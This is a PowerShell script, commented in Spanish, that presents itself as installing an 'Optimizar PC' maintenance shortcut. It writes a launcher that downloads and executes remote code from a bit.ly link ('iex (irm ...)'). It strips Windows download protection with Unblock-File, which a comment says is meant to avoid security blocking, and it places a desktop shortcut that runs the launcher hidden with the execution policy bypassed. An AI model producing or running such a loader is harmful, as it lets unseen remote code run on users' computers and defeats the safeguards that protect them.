# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationFramework

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo
$AppDir = Join-Path $env:LOCALAPPDATA "AntonyDapier"
$LauncherFile = Join-Path $AppDir "launcher.ps1"

# 1. Crear carpeta local si no existe
if (-not (Test-Path $AppDir)) { New-Item -ItemType Directory -Path $AppDir -Force | Out-Null }

# 2. Crear el lanzador local (esto evita el bloqueo de seguridad de Windows)
$LauncherContent = 'iex (irm https://bit.ly/mandia-windows)'
$LauncherContent | Set-Content -Path $LauncherFile -Force
Unblock-File -Path $LauncherFile

# 3. Crear el acceso directo apuntando al archivo local
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$LauncherFile"""
$Shortcut.IconLocation = "imageres.dll,109" # Icono de herramientas
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

# Quitar bloqueo de descarga al acceso directo
Unblock-File -Path $ShortcutPath

[System.Windows.MessageBox]::Show("¡Instalación completada!`n`nSe ha creado el acceso directo 'Optimizar PC - Antony Dapier' en tu escritorio. Ya puedes usar la herramienta.", "Antony Dapier - Mantenimiento", "OK", "Information")
